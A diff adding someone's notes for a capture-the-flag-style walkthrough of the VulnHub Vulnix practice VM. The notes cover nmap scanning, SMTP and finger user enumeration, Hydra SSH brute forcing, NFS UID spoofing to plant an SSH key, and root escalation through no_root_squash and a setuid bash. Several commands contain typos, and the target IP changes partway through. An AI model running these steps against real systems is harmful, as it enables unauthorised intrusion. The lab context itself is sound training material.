@@ -1,0 +1,95 @@
+#my walkthrough to HackLAB:Vulnix
+#https://www.vulnhub.com/entry/hacklab-vulnix,48/
+#thanks to http://www.abatchy.com/2016/10/walkthrough-vulnix-vulnhub-vm
+0. Get VM's IP
+netdiscover -r 192.168.195.0/24
+#-r range
+nmap -F -Pn 192.168.195.0/24
+#-F fast mode 
+#-Pn treat all hosts as online
+
+traget host - 192.168.195.131
+
+1. Enumeration
+
+nmap -p- -sS -A 192.168.195.131
+#-p- scan ports from 1 through 65535
+#-sS TCP SYN scan
+#-A Enable OS detection? version detection, script scanning and traceroute
+
+##VECTOR - mailserver
+nc -nv 192.168.195.131 25
+#-nv numeric-only IP addr, verbose
+VRFY
+#VRFY asks the server to confirm that a specified user name or mailbox is valid (exist)
+smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.195.131
+
+#Port79:Finger. Finger protocol is simple netwirk protocol for exchange of human-oriented status and user information
+finger user@192.168.195.131
+finger vulnix@192.168.195.131
+# we see 
+#Directory: /home/user  
+#Directory: /home/vulnix
+#it means that users user and vunlix exist because exist home's directories for this users
+
+#Port2048: NFS net file system
+
+192.168.25.133
+1.2 NFS enumeration
+snowmount -e 192.168.25.133
+#-e show the NFS server's esport list
+mkdir /tmp/nfs
+mount -t nfs 192.168.25.133:/home/vulnix /tmp/nfs -nolock
+#mount - mount a filesystem
+#-t fstype - nfs
+# mount [-fnrsvw] [-t fstype] [-o options] device dir
+
+2. Gaining Access
+2.1 Bruteforcing SSH
+hydra -l user -P rockyou.txt 192.168.25.133 ssh -t 4
+#-t 4 - number of connects in parallell per target
+#-l one username -L username_list
+
+2.2 Privelegie escalation P1
+ssh user@192.168.25.133
+id vulnix
+#UID2008
+#exit
+useradd -u 2008 vulnix
+#get the UID to vulnix and create temporary user on ous system and access it
+mkdir /tmp/mnt
+mount -t nfs 192.168.25.133:/home/vulnix /tmp/mnt -nolock
+su vulnix
+#now we can access to mouned dir
+cd /tmp/mnt
+#generate ssh keys for SSH so we can login into vulnix
+#exit
+ssh-keygen
+#create dir on the mounted shared
+mkdir ~/.ssh
+#copy content of the publick key into ~/.ssh
+echo ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDYR4TR6AyxQF/A+CXvr8NdJvzn7Rjg36s5cfq0rco2K4nBW34uy0pPhtTVYOTIRJPf6+E+QAFdVD+ui6FAMlVdQYEWY/U2yBV4ckXEN3U0DK9QNptGkMf/KZV6BRFWeVS68XgFeiBQXZj3PLSOBkVO3g/PHxOlRb0dfu5+r$
+authorized_keys
+ssh vulnix@192.168.25.133
+
+2.3. Privilege Escalation P2 (root)
+sudo -l
+#list user's privileges or check a specific command
+#we see that user vulnix may: sudoedit /etc/exports
+#/etc/exports controls which file system are exported to remote hosts and specific options
+/root *(rw, no_root_squash)
+#/root *(rw, no_root_squash) it means that all can mount 
+#no_root_squash means remote users are able to change any file 
+
+restart VULNIX
+
+umount -l -f /tmp/mnt
+
+mount -t nfs 192.168.25.133:/home/vulnix /tmp/mnt
+
+#then we copy /bin/bash and gain it setuid permission
+
+
+
+
+
